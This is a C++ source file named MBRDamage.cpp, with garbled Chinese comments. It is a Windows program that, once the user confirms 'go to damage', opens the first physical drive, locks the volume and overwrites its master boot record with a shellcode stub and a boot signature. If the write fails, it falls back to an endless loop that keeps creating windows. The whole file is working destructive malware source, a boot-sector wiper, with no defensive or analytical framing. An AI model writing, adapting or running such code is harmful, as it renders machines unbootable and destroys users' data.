// MBRDamage.cpp : �������̨Ӧ�ó������ڵ㡣
//

//��Ϊwrite MBR(��������¼)�ĳ���

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
//#include <winioctl.h> 

unsigned char scode[]=
	"\xb8\x12\x00"
	"\xcd\x10\xbd"
	"\x18\x7c\xb9";

DWORD writeMBR()
{
	DWORD dwBytesReturned;
	BYTE pMBR[512]={0};

	//���ƻ�����д�����pMBR
	memcpy(pMBR, scode, sizeof(scode));
	pMBR[510]=0x55;
	pMBR[511]=0xaa;

	//���������
	HANDLE hDevice = CreateFile(_T("\\\\.\\PhysicalDrive0"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("��...�����ļ�ʧ�ܣ�");
		return -1;
	}

	//������ʹ��FSCTL_LOCK_VOLUMEʱ�������м���������ΪNULL,0;
	/*Parameters
	hDevice
	A handle to the volume to be locked. To retrieve a device handle, call the CreateFile function. 

	dwIoControlCode
	The control code for the operation. Use FSCTL_LOCK_VOLUME for this operation. 

	lpInBuffer
	Not used with this operation; set to NULL.

	nInBufferSize
	Not used with this operation; set to zero.

	lpOutBuffer
	Not used with this operation; set to NULL.

	nOutBufferSize
	Not used with this operation; set to zero.

	lpBytesReturned
	A pointer to a variable that receives the size of the data stored in the output buffer, in bytes. */


	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	//д������ļ� 
	WriteFile(hDevice, pMBR, 512, &dwBytesReturned, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	return 0;
}

int main(int argc, char* argv[])
{
	HINSTANCE hinst; 
	int a;
	printf("Are you sure? any key:exit or 1:go to damage");
	scanf("%d",&a);
	if (a == 1) {
		if(writeMBR()!=0){
			while(1){
				CreateWindowEx(NULL,TEXT("MyClass"),TEXT("Title"),
											WS_OVERLAPPEDWINDOW|WS_VISIBLE,500,500,
											500,500,NULL,NULL,hinst,NULL);
				printf("aaaaa....");
			}	
		}
	} else {
		exit(0);
	}
	return 0;
}


